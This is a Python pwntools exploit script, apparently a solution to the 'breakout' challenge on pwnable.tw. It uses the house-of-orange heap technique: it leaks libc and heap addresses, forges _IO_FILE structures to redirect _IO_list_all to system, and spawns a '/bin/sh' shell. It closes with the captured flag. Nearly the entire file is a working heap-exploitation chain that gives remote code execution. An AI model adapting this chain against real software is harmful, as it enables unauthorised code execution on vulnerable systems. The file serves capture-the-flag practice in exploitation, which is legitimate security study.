from pwn import *


# Use -> house_of_orange technic!!


def list_(until=False):
    r.recvuntil(b'> ')
    r.sendline(b'list')

    if until is not False:
        r.recvuntil(until)


def note(cell, size, data):
    r.recvuntil(b'> ')
    r.sendline(b'note')
    r.recvuntil(b'Cell: ')
    r.sendline(str(cell).encode())
    r.recvuntil(b'Size: ')
    r.sendline(str(size).encode())
    r.recvuntil(b'Note: ')
    r.send(data)


def punish(cell):
    r.recvuntil(b'> ')
    r.sendline(b'punish')
    r.recvuntil(b'Cell: ')
    r.sendline(str(cell).encode())


'''
   typedef struct prisoner_s {
           const char *risk;
           char *name;
           char *aka;
           uint32_t age;
           uint32_t cell;
       char *sentence;
           uint32_t note_size;
       char *note;
       struct prisoner_s *next;
   } Prisoner;
   '''

elf = ELF("breakout")
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10400)

with log.progress("leaking address") as l:
    note(0, 100, b'A')
    note(1, 100, b'B')
    note(2, 100, b'C')
    note(3, 100, b'D')
    note(0, 200, b'a')
    note(2, 200, b'c')
    note(8, 0x200, b'8')
    note(9, 100, b'9')  # heap address leak from fastbin
    note(0, 0x150, b'0' * 0x150)
    note(2, 0x200, b'2')
    note(5, 0x80, b'q' * 0x8)
    l.status("note added")

    list_(b'q' * 0x8)
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    libc_base = libc_leak - 0x3c4d08 + 0x1000
    log.success("libc_base --> %s" % hex(libc_base))
    list_(b"Sentence: Life imprisonment, guilty for more than 26 contract kills\nNote: ")
    heap_leak = u64(r.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x12439
    log.success("heap_base --> %s" % hex(heap_base))

    system = libc_base + libc.symbols['system']
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    note(8, 0x1000, b'Make_unsortedbin!!')
    punish(0)
    l.success()

with log.progress("sending payload") as l:
    l.status("first payload")
    payload = p64(0xffffffffffffffff) + p64(heap_base + 0x11ce0) + p64(heap_base + 0x11d00)
    payload += p32(0x28) + p32(0x0)
    payload += p64(heap_base + 0x11d20)
    payload += p64(0x1000)
    payload += p64(heap_base + 0x12680)  # sentence -> unsorted bin
    note(7, 0x40, payload)

    l.status("payload 2")
    payload = b"/bin/sh\x00" + p64(0x61)  # top top[1]

    payload += p64(_IO_list_all - 0x9a8) + p64(_IO_list_all - 0x10)  # top[2] top[3]
    payload += p64(0x0) + p64(0x0)  # top[4] top[5]
    payload += p64(0x0) + p64(0x0)  # top[6] top[7]
    payload += p64(0x0) + p64(0x0)  # top[8] top[9]
    payload += p64(0x0) + p64(0x0)  # top[10] top[11]
    payload += p64(0x0) + p64(0x0)  # top[12] top[13]
    payload += p64(0x0) + p64(system)  # top[14] top[15]
    payload += p64(0x0) + p64(0x0)  # top[16] top[17]
    payload += p64(0x0) + p64(0x0)  # top[18] top[19]
    payload += p64(heap_base + 0x12710) + p64(0x2)  # top[20] top[21]
    payload += p64(0x3) + p64(0x0)  # top[22] top[23]
    payload += p64(0x1) + p64(0x0)  # top[24] top[25]
    payload += p64(0x0) + p64(heap_base + 0x126e0)  # top[26] top[27]

    note(0, len(payload), payload)

    r.recvuntil(b'>')
    r.sendline(b'note')
    r.recvuntil(b'Cell: ')
    r.sendline(b'6')
    r.sendline(b'30')
    l.success()
    r.recvuntil(b"Size: ")
    r.interactive()

# FLAG --> FLAG{Br3ak_0ut_7He_Pr1s0N}
